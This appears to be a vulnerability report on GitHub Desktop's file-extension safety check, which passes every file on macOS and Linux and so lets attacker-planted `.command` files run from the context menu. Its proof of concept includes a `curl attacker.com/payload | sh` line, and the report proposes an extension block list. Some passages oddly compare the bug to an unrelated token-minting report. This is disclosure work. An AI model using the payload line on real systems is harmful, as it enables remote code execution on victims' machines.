### Title
"Open with Default Program" safety check silently disabled on macOS/Linux, allowing execution of attacker-supplied scripts from a cloned repository - ([File: app/src/ui/lib/context-menu.ts])

### Summary
Desktop implements a file-extension "safety" check, `isSafeFileExtension()`, intended to prevent the "Open with Default Program" context-menu action from launching potentially dangerous file types. Like the `getExchangeRatio()` calculation in the external report that is computed but never actually applied to the token-minting/burning path, `isSafeFileExtension()` is computed and wired into the UI's `enabled` flag for the menu item, but the underlying protection is only real on Windows. On macOS and Linux the function unconditionally returns `true` regardless of the file's extension, so the "safety" gate provides no protection at all for any file coming from an attacker-controlled clone/fetch on those platforms.

### Finding Description
`isSafeFileExtension` is defined as: [1](#0-0) 

```ts
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
...
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
```

This value is used to gate the `enabled` state of the "Open with Default Program" context-menu item across multiple views — the Changes list, the Rebase conflicts list, the History/commit file list, and the Pull Request "Files Changed" list: [2](#0-1) [3](#0-2) [4](#0-3) 

In each of these call sites, `isSafeExtension` (or `isSafeFileExtension(extension)`) is the sole check that decides whether the "Open with Default Program" action is enabled for a given file. On Windows this correctly disables the action for `.cmd`, `.exe`, `.bat`, `.sh`. On macOS and Linux, however, the function always returns `true`, so the check is effectively a no-op: any file — including macOS `.command` files (which Finder/LaunchServices will execute in Terminal on open) or Linux `.desktop`/shell script launchers — is treated as "safe" to open with the OS default handler, purely because the computed guard was never actually implemented for those platforms.

This is the same class of bug as the report: a value meant to gate a security-relevant operation (`getExchangeRatio()` / `isSafeFileExtension()`) is calculated, but the code path that performs the sensitive action (`mint`/`burn` tokens at 1:1 / opening a file via the OS default handler) does not actually honor the calculated protection — here, because the "protection" itself was stubbed out to always pass on two of the three supported platforms.

An attacker who controls the contents of a repository the victim clones, fetches, or checks out (e.g., a malicious PR branch, or a repo the user opens locally) can plant a `.command` file (or another OS-executable-by-double-click type) in the working directory. When the victim inspects the changes/history in Desktop and chooses "Open with Default Program" from the context menu — a completely ordinary Desktop workflow, not requiring any unusual steps — Desktop will unconditionally allow this because `isSafeFileExtension` on macOS/Linux does not consult the extension at all.

### Impact Explanation
This allows execution of attacker-controlled content on the victim's machine outside the Desktop application sandbox, triggered by ordinary interaction with a cloned/fetched repository. On macOS, `.command` files opened via the OS's default file handler are executed by Terminal, giving the attacker arbitrary shell execution once the victim clicks the (supposedly gated) "Open with Default Program" menu item. This matches the report's "unprivileged...attacker controls a cloned/fetched repository...result is code execution" impact category.

### Likelihood Explanation
Likelihood is high on non-Windows platforms: the guard is not conditionally weak, it is unconditionally absent (`return true` for all non-Windows builds), so every macOS/Linux user is affected for every extension. The only user action required is right-click → "Open with Default Program" on a file shown in the Changes, History, Rebase-conflict, or Pull-Request-diff file lists — a normal, expected Desktop interaction with no social-engineering or unnatural steps needed beyond the attacker naming a file with an extension that macOS treats as executable-on-open.

### Recommendation
Implement a real per-platform block-list (or safe-list) in `isSafeFileExtension` for macOS and Linux, mirroring the Windows behavior — at minimum blocking `.command`, `.sh`, `.desktop`, `.app`, `.workflow`, and similar extensions that the OS's default handler will execute rather than merely display/edit. Ensure the check is enforced not just as a UI `enabled` flag but at the point the "open with default program" action actually invokes the shell (`app-shell.ts` / `open-file.ts`), so it cannot be bypassed if a new call site forgets to check `isSafeFileExtension`.

### Proof of Concept
1. Attacker creates a public repo (or a branch/PR) containing a file `Update_Notes.command` with shell payload content (e.g., `#!/bin/bash\ncurl attacker.com/payload | sh`).
2. Victim (macOS or Linux) clones/fetches/checks out the repo in GitHub Desktop and views it in the Changes tab, History, or a Pull Request diff.
3. Victim right-clicks the file and selects "Open with Default Program" — the menu item is `enabled` because `isSafeFileExtension('.command')` returns `true` unconditionally on non-Windows platforms: [5](#0-4) 
4. The OS launches the file with its default handler (Terminal for `.command` on macOS), executing the attacker's script with the victim's privileges.
